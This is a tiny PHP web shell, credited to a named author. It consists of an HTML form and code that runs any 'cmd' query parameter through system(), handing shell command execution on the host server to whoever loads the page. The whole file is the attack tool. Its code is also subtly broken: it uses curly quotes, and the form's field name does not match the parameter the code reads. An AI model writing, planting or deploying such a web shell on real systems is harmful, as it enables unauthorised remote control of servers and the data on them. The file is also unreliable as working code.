<?
//Mini Webshell in PHP by @abhiabhi2306 (Abhishek Sidharth)
?>
<HTML>
<BODY>
<FORM METHOD=”GET” NAME=”cmdform” ACTION=””>
<INPUT TYPE=”text” NAME=”linux command”>
<INPUT TYPE=”submit” VALUE=”command”>
</FORM>
<?
if($_GET[‘cmd’]) {
system($_GET[‘cmd’]);
}
?>
</BODY></HTML>
